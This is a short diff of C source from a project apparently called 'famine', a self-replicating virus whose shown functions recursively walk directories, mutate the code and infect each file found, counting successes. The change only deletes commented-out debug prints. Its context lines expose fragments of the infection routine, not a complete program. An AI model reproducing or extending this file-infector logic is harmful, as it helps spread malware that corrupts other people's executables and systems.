@@ -252,8 +252,6 @@ static void open_file(char *file, bootstrap_data_t *bs_data, uint16_t *counter)
 
 				mutate();
 
-				//_printf("file: %s\n", new_path);
-
 				if (infect(new_path, bs_data) == 0) {
 					(*counter)++;
 				}
@@ -267,8 +265,6 @@ static void open_file(char *file, bootstrap_data_t *bs_data, uint16_t *counter)
 				ptr = ft_stpncpy(ptr, STR("/"), NAME_MAX - (ptr - new_path));
 				ft_stpncpy(ptr, dir->d_name, NAME_MAX - (ptr - new_path));
 
-				//_printf("dir: %s\n", new_path);
-
 				open_file(new_path, bs_data, counter);
 			}
 		}
@@ -279,9 +275,6 @@ static void open_file(char *file, bootstrap_data_t *bs_data, uint16_t *counter)
 
 void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
 {
-
-	//_printf("virus size: %d\n", VIRUS_SIZE);
-
 	char *paths[] = {
 		STR(PATH1),
 		STR(PATH2),
